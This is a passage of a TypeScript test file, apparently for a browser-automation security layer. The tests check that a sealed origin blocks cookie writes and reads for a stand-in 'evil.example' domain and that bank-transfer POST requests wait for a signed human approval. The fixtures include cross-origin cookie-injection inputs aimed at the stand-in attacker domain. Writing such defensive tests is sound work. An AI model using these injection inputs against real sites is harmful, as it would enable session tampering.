    const authority = await AuthorityVaultAndChannel.create();
    const approvalGate = new ApprovalGate(authority);
    const auditLog = new SignedAuditLog(authority);
    const policyEngine = new PolicyEngine({ auditLog });
    const controllerLeases = new ControllerLeaseManager();
    const events: CdpEvent[] = [];
    const { ctx, target } = makeTestDispatchEnv({
      connectionMode: "browser",
      url: "https://bank.example/app",
      sessionIdStr: "sess-store-gate",
      policyEngine,
      controllerLeases,
      events,
      authority,
      approvalGate,
      auditLog,
    });

    // Storage policy enforcement under sealedOrigin for CDP cookie writes/reads.
    await dispatch(ctx, {
      id: 20,
      method: "Network.setCookie",
      params: {
        name: "sid",
        value: "bank-cookie",
        domain: "bank.example",
        path: "/",
        secure: true,
      },
      sessionId: "sess-store-gate",
    });
    await dispatch(ctx, {
      id: 21,
      method: "Network.setCookie",
      params: {
        name: "eid",
        value: "evil-cookie",
        domain: "evil.example",
        path: "/",
        secure: true,
      },
      sessionId: "sess-store-gate",
    });

    target.sealedOrigin = "https://bank.example";
    const blockedWrite = await dispatch(ctx, {
      id: 22,
      method: "Network.setCookie",
      params: { name: "eid2", value: "nope", domain: "evil.example", path: "/", secure: true },
      sessionId: "sess-store-gate",
    });
    expect(expectCdpErrorMessage(blockedWrite)).toContain("Sealed origin");

    const filteredAll = await dispatch(ctx, {
      id: 23,
      method: "Network.getAllCookies",
      sessionId: "sess-store-gate",
    });
    const allCookies =
      expectCdpResult<{ cookies?: Array<{ domain: string }> }>(filteredAll).cookies ?? [];
    expect(allCookies.some((c) => c.domain.includes("bank.example"))).toBe(true);
    expect(allCookies.some((c) => c.domain.includes("evil.example"))).toBe(false);

    // Outbound Set-Cookie write for mismatched origin is blocked when sealedOrigin is set.
    registerConnectionPolicy("sec-cookie-out", policyEngine);
    setFrameSealedOrigin("sec-cookie-out", "frame-c1", "https://bank.example");
    const outbound = createSandboxOutboundOverride(createMemoryHostCapabilities(), {
      fetch: async () =>
        new Response("ok", {
          headers: { "set-cookie": "x=bad; Domain=evil.example; Path=/" },
        }),
    });
    const jar = createCookieJar();
    registerCookieJar("sec-cookie-out", jar);
    const outRes = await outbound
      .parent({
        pageOrigin: "https://bank.example",
        pageUrl: "https://bank.example/app",
        mainFrameId: "frame-c1",
        connectionId: "sec-cookie-out",
        cookieKey: "sec-cookie-out",
        skipRequestBlocker: true,
      })
      .fetch(new Request("https://bank.example/api"));
    expect(outRes.status).toBe(200);
    expect(jar.cookieHeaderForUrl("https://evil.example/")).toBeNull();
    unregisterCookieJar("sec-cookie-out");
    unregisterConnectionSecurity("sec-cookie-out");

    // Page.navigate with POST + approval timeout fails cleanly with approval denial.
    target.sealedOrigin = null;
    const postDenied = await dispatch(ctx, {
      id: 30,
      method: "Page.navigate",
      params: {
        url: "https://bank.example/transfer",
        _parawingPostData: "amount=100",
        _parawingApprovalTimeoutMs: 25,
      },
      sessionId: "sess-store-gate",
    });
    expect(expectCdpResult<{ errorText?: string }>(postDenied).errorText).toContain(
      "Approval denied",
    );
    expect(events.some((e) => e.method === "Parawing.approvalRequired")).toBe(true);

    // Parawing.requestActionApproval + Parawing.submitApprovalDecision approves on valid signature.
    events.length = 0;
    const reqApprovalPromise = dispatch(ctx, {
      id: 31,
      method: "Parawing.requestActionApproval",
      params: {
        action: { method: "POST", url: "https://bank.example/transfer", body: "amount=50" },
        domFields: [{ name: "amount", value: "$50", masked: false }],
        timeoutMs: 2_000,
      },
      sessionId: "sess-store-gate",
    });
    await vi.waitFor(() => {
      expect(events.some((e) => e.method === "Parawing.approvalRequired")).toBe(true);
    });
    const promptEv = events.find((e) => e.method === "Parawing.approvalRequired")!;
    const promptParams = promptEv.params as { nonce: string; requestDigest: string };
    const signed = await approvalGate.signDecision({
      requestDigest: promptParams.requestDigest,
      nonce: promptParams.nonce,
      expiresAt: Date.now() + 10_000,
      approved: true,
    });
    const submitRes = await dispatch(ctx, {
      id: 32,
      method: "Parawing.submitApprovalDecision",
      params: { payload: signed.payload, signatureBase64: signed.signatureBase64 },
      sessionId: "sess-store-gate",
    });
    expect(expectCdpResult(submitRes)).toMatchObject({
      approved: true,
      reason: "signed-approval",
    });
    const reqApprovalRes = await reqApprovalPromise;
    expect(expectCdpResult<{ approved?: boolean }>(reqApprovalRes).approved).toBe(true);
  });
});
